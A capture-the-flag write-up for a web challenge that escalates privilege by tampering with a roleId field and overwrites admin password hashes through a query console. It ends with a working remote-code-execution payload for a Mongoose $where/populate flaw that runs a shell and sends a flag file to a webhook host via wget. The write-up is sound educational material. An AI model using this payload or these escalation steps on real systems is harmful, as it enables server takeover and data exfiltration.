# Nova Crest — MCTF 2025

**Category:** Web  
**Flag:** `mctf{qm0nG_m0n60_1$nT_$afE_7oOl_4f+Er_41L}`
**type:** Black Box
**Author:** COn4n


## Description
Web challenge with 0 solves, broke codex/claude and all AI agents that tried to solve it xD. The challenge is a web application with a MongoDB backend, and an admin panel that includes a custom query interface for the database. The main vulnerability is an RCE in Mongoose 8.8.2, which can be exploited through the query interface to read the flag from the server.


## Recon & Initial Foothold

We land on the main page, Nova Crest, a company that does gene stuff and genetic edits on ADN. Fancy.

Head over to `/register`, sign up with `test@gmail.com:test`, then log in.

A few tabs show up: "Apply to join the team," etc. The one that matters is **Update Profile**.

If we check the public profile endpoint, we get something like:

```json
{
    "user": {
        "id": "6a0366dba477a85fd72b7810",
        "email": "test@gmail.com",
        "fullName": "test",
        "roleCode": "external",
        "roleName": "External",
        "roleId": "2",
        "userType": "external",
        "status": "active",
        ...
    }
}
```

The interesting field here is `roleId`. It's sequential, ours is `2`. A classic old trick: try `0` or `1` and see if you get extra access.

So we send a PATCH to the update profile endpoint with `"roleId":"0"`. Boom, admin. Textbook privilege escalation, but hey, it works.

Log out, log back in, and we're admins now. A bunch of new tabs appear. Most of them are pure scam designed to waste your time. The three that should catch your eye are: **ErrorLogs**, **AuditLogs**, and **Qmongo**.

Audit logs would be useful in a forensics challenge. This is not a forensics challenge. Moving on.

---

## Qmongo & Admin Takeover

Error logs are password-protected. We try our own password, no dice.

On to **Qmongo**. It's an internal tool that lets you query the MongoDB backing the platform, but with a weird syntax, MongoDB queries dressed up in SQL-like clothing. There's a documentation tab, a code editor, and an execution button. When you run a query, you get a fancy graph visualization of the results and their relations.

Open dev tools and you'll notice the debugger fires and stops the UI, some JS protection mechanisms are in play. The JS is obfuscated, so that'll take some work. We'll come back to this.

Let's explore Qmongo. Running the default query:

```json
{"query":"from User limit 1"}
```

Returns:

```json
{
    "data": [
        [
            {
                "_id": "69f4ebae5fc4f5721fd06f70",
                "email": "admin@novacrest-bio.com",
                "fullName": "NovaCrest Administrator",
                "passwordHash": "scrypt$9a7f00c69c5039d9b96b33e2d7f2cea1$3287423a35c3e3781afe90c2745ad562454056ad9ff690a982a738eb177e6f4b5350a31b31331bcdba75aa16d22c90a023c7b37c96316fdf650cd2022c61beb5",
                "roleId": "0",
                "userType": "internal",
                "status": "active",
                "emailVerifiedAt": "2026-05-01T18:06:38.517Z",
                "phoneNumber": "",
                "title": "",
                "avatarUrl": "",
                "mustSetPassword": false,
                "verifyEmailTokenHash": null,
                "verifyEmailTokenExpiresAt": null,
                "resetPasswordTokenHash": null,
                "resetPasswordTokenExpiresAt": null,
                "logs_password": "scrypt$fd7303f5ab1d0131980c08f262803d31$b6b49d6bd0a8ed2c9e054e4394b4c611ae3616367ab9f11e206156a77eb4dffda530c6ffbd12b5d11fbad33a617d26f61020473307f8b25888b1acd1147d4d35",
                "logs_enabled": true,
                "lastLoginAt": null,
                "deletedAt": null,
                "deletedBy": null,
                "createdAt": "2026-05-01T18:06:38.523Z",
                "updatedAt": "2026-05-01T22:59:01.150Z"
            },
            ...
        ]
    ]
}
```

Lots of interesting fields. We can see the main admin's `passwordHash` and `logs_password`, both hashed (scrypt, not cracking these).

Following the Qmongo documentation, we can alter the admin's fields directly:

```
update User
where email == "admin@novacrest-bio.com"
set {
    password = "<hash_of_our_password>",
    logs_password="<hash_of_our_password>",
}
```

Now we log into the main admin account. From there, we can access the error logs using the password we just set. Alternatively, give our own account logs access:

```
Update User where email == "<email>" set {
    logs_password="<hash_of_our_password>",
    logs_enabled=true
}
```

---

## Triggering Errors & Finding the Vuln

Nothing interesting in the logs yet. Let's trigger some errors ourselves.

We throw a bad Qmongo query at it. Opening the error logs, we see each entry has: source, category, and a stack trace.

To trigger a concrete error, let's try an email duplication:

```
insert into User {
    email:"test@gmail.com"
}
```

This fails (of course, missing required fields), and we get back:

```
ValidationError: User validation failed: userType: Path `userType` is required., roleId: Path `roleId` is required., passwordHash: Path `passwordHash` is required., fullName: Path `fullName` is required. at Document.invalidate (/app/node_modules/.pnpm/mongoose@8.8.2/node_modules/mongoose/lib/document.js:3318:32) at /app/node_modules/.pnpm/mongoose@8.8.2/node_modules/mongoose/lib/document.js:3079:17 at /app/node_modules/.pnpm/mongoose@8.8.2/node_modules/mongoose/lib/schemaType.js:1388:9 at process.processTicksAndRejections (node:internal/process/task_queues:84:11)
```

Beautiful stack trace, it tells us exactly which version of Mongoose is running: **8.8.2**.

---

## The RCE

Mongoose 8.8.2 has a known RCE vulnerability: **CVE-2025-23061**. You can read the full details [here](https://www.opswat.com/blog/technical-discovery-mongoose-cve-2025-23061-cve-2024-53900).

This is the homestretch. Now we need to craft a payload that exploits the CVE through the Qmongo query interface. Here's where it gets trickier, the JS file `index-Mn8QaZ5r.js` contains the full Qmongo query language parser. You can throw it at an AI (deepseek) combined with a deobfuscation tool (de4js), or do it manually the hard way.

Multiple players found the injection point, but since it had to land inside the `populate` function specifically, getting the right payload shape was the tricky part.

Final payload:

```bash
from User include roleId {
where "$where"=="typeof global!=='undefined'? console.log(process.binding('spawn_sync').spawn({file: '/bin/sh',args: ['/bin/sh', '-c', 'wget https://webhook.site/webhook-id?flag=$(cat /flag/flag.txt)'], stdio: [ { type: 'pipe', readable: 1, writable: 0 },{ type: 'pipe', readable: 0, writable: 1 }, { type: 'pipe', readable: 0, writable: 1 }]}).output[1].toString()) : 1"
}
```

And that's it. Flag exfiltrated, challenge solved, 0-solve status secured. GG.
